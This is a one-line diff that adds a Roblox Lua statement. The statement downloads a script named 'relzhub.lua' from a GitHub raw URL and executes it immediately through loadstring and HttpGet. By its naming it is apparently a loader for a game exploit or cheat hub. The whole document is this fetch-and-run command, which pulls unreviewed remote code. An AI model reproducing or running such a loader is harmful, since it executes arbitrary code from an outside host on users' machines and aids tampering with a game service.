@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Corwnbot/Kgfhub/main/relzhub.lua"))()
